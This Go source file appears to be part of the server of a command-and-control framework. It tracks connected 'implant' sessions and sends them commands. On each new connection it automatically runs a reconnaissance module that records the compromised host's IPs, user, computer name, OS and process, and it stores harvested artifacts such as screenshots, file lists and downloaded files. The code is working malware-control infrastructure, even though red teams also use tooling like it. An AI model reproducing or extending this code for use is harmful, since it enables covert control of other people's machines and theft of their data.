package main

import (
	"bufio"
	"encoding/json"
	"fmt"
	"net"
	"sync"
	"sync/atomic"
	"time"
)

// Session is one connected implant. Each session runs a reader goroutine that
// decodes implant->server lines and fans them out as Events to subscribers.
type Session struct {
	ID        uint64
	Addr      string
	Since     time.Time
	conn      net.Conn
	wr        *bufio.Writer
	wrMu      sync.Mutex // serialize server->implant writes
	closed    atomic.Bool
	bus       *EventBus
	closeOnce sync.Once
}

func (s *Session) String() string { return fmt.Sprintf("#%d %s", s.ID, s.Addr) }

// Send writes a serverMsg to the implant (newline-terminated, flushed).
func (s *Session) Send(m serverMsg) error {
	b, err := json.Marshal(m)
	if err != nil {
		return err
	}
	s.wrMu.Lock()
	defer s.wrMu.Unlock()
	if _, err := s.wr.Write(b); err != nil {
		return err
	}
	if err := s.wr.WriteByte('\n'); err != nil {
		return err
	}
	return s.wr.Flush()
}

func (s *Session) Close() {
	s.closeOnce.Do(func() {
		s.closed.Store(true)
		s.conn.Close()
	})
}

// SessionManager holds all live sessions, keyed by ID.
type SessionManager struct {
	mu       sync.RWMutex
	sessions map[uint64]*Session
	nextID   uint64
	bus      *EventBus
}

func NewSessionManager(bus *EventBus) *SessionManager {
	return &SessionManager{sessions: make(map[uint64]*Session), bus: bus}
}

// Accept registers a new implant connection and starts its reader loop.
func (sm *SessionManager) Accept(conn net.Conn) *Session {
	id := atomic.AddUint64(&sm.nextID, 1)
	s := &Session{
		ID:    id,
		Addr:  conn.RemoteAddr().String(),
		Since: time.Now(),
		conn:  conn,
		wr:    bufio.NewWriter(conn),
		bus:   sm.bus,
	}
	sm.mu.Lock()
	sm.sessions[id] = s
	sm.mu.Unlock()

	sm.bus.Publish(Event{Type: "implant_connected", ImplantID: id, Data: s.Addr})
	fmt.Fprintf(logf(), "[core] implant %s connected\n", s)
	// Record the agent in the persistent roster (upserts last_seen/addr).
	if store != nil {
		store.TouchAgent(id, s.Addr, time.Now().Unix())
	}
	// Auto-run the sysinfo recon BOF so the operator console populates host
	// fields (IP, user, computer, OS, …) the moment the implant connects.
	if sysinfoColl != nil {
		sysinfoColl.Request(s)
	}
	go s.readLoop()
	return s
}

func (sm *SessionManager) Get(id uint64) (*Session, bool) {
	sm.mu.RLock()
	defer sm.mu.RUnlock()
	s, ok := sm.sessions[id]
	return s, ok
}

func (sm *SessionManager) List() []SessionInfo {
	sm.mu.RLock()
	defer sm.mu.RUnlock()
	out := make([]SessionInfo, 0, len(sm.sessions))
	for _, s := range sm.sessions {
		out = append(out, SessionInfo{ID: s.ID, Addr: s.Addr, Since: s.Since})
	}
	return out
}

func (sm *SessionManager) remove(id uint64, s *Session) {
	sm.mu.Lock()
	delete(sm.sessions, id)
	sm.mu.Unlock()
	s.Close()
	sm.bus.Publish(Event{Type: "implant_disconnected", ImplantID: id, Data: s.Addr})
	fmt.Fprintf(logf(), "[core] implant %s disconnected\n", s)
}

// readLoop decodes implant->server JSON lines until EOF/error.
func (s *Session) readLoop() {
	rd := bufio.NewReader(s.conn)
	scan := bufio.NewScanner(rd)
	scan.Buffer(make([]byte, 0, 1<<20), 4<<20)
	for scan.Scan() {
		line := scan.Text()
		if line == "" {
			continue
		}
		var m implantMsg
		if err := json.Unmarshal([]byte(line), &m); err != nil {
			fmt.Fprintf(logf(), "[core] implant %s bad line: %v\n", s, err)
			continue
		}
		// Map wire type -> event type, publish to subscribers.
		et := m.Type // "hello" | "output" | "error"

		// Intercept the auto-run sysinfo BOF's result BEFORE normal fan-out so
		// it doesn't collide with operator-driven BOF tasks. The first
		// output/error after connect is consumed as the sysinfo payload.
		if (et == "output" || et == "error") && sysinfoColl != nil && sysinfoColl.Pending(s.ID) {
			sysinfoColl.Clear(s.ID)
			if et == "output" {
				fields := parseSysinfo(m.Data)
				if len(fields) > 0 {
					if store != nil {
						_ = store.PutSysinfo(s.ID, fields)
					}
					s.bus.Publish(Event{Type: "sysinfo", ImplantID: s.ID, Data: fieldsJSON(fields)})
					fmt.Fprintf(logf(), "[core] implant %s sysinfo: %s\n", s, fields["computer"])
				}
			} else {
				fmt.Fprintf(logf(), "[core] implant %s sysinfo failed: %s\n", s, m.Data)
			}
			continue
		}

		s.bus.Publish(Event{Type: et, ImplantID: s.ID, Data: m.Data})
		// Correlate BOF output/error to the task that triggered it.
		if et == "output" || et == "error" {
			bofName := tasks.Feed(s.ID, et, m.Data)
			// Persist the output as a per-agent artifact (file_list/proc_list/
			// screenshot/file_download) so the GUI can rehydrate history after
			// a restart. Only captures successful output of known BOFs.
			if et == "output" && store != nil && bofName != "" {
				captureArtifact(bofName, s.ID, m.Data)
			}
		}
		switch m.Type {
		case "hello":
			fmt.Fprintf(logf(), "[core] implant %s hello: %s\n", s, m.Data)
		case "output":
			fmt.Fprintf(logf(), "[core] implant %s output: %s\n", s, m.Data)
		case "error":
			fmt.Fprintf(logf(), "[core] implant %s error: %s\n", s, m.Data)
		}
	}
	if err := scan.Err(); err != nil {
		fmt.Fprintf(logf(), "[core] implant %s read error: %v\n", s, err)
	}
	manager.remove(s.ID, s)
}

// SessionInfo is the JSON shape for GET /api/implants.
type SessionInfo struct {
	ID    uint64    `json:"id"`
	Addr  string    `json:"addr"`
	Since time.Time `json:"since"`
}

// ImplantView is SessionInfo enriched with the recon fields collected by the
// auto-run sysinfo BOF (so the GUI agent table shows IP/user/OS/…). Fields are
// empty until the sysinfo BOF reports back.
type ImplantView struct {
	ID          uint64 `json:"id"`
	Addr        string `json:"addr"`
	Since       int64  `json:"since"`
	LastSeen    int64  `json:"last_seen"`
	InternalIP  string `json:"internal_ip,omitempty"`
	ExternalIP  string `json:"external_ip,omitempty"`
	User        string `json:"user,omitempty"`
	Computer    string `json:"computer,omitempty"`
	ProcessName string `json:"process_name,omitempty"`
	PID         string `json:"pid,omitempty"`
	OS          string `json:"os,omitempty"`
	OSBuild     string `json:"os_build,omitempty"`
	Arch        string `json:"arch,omitempty"`
	OnlineTime  string `json:"online_time,omitempty"`
}

// ListEnriched returns all live sessions with their persisted sysinfo fields
// merged in (one batched query — no N+1).
func (sm *SessionManager) ListEnriched() []ImplantView {
	sessions := sm.List()
	ids := make([]uint64, 0, len(sessions))
	for _, s := range sessions {
		ids = append(ids, s.ID)
	}
	batch := map[uint64]map[string]string{}
	if store != nil {
		batch, _ = store.GetSysinfoBatch(ids)
	}
	out := make([]ImplantView, 0, len(sessions))
	for _, s := range sessions {
		v := ImplantView{
			ID:       s.ID,
			Addr:     s.Addr,
			Since:    s.Since.Unix(),
			LastSeen: s.Since.Unix(),
		}
		if f, ok := batch[s.ID]; ok {
			v.InternalIP = f["internal_ip"]
			v.ExternalIP = f["external_ip"]
			v.User = f["user"]
			v.Computer = f["computer"]
			v.ProcessName = f["process"]
			v.PID = f["pid"]
			v.OS = f["os"]
			v.OSBuild = f["os_build"]
			v.Arch = f["arch"]
			v.OnlineTime = f["online_time"]
		}
		out = append(out, v)
	}
	return out
}
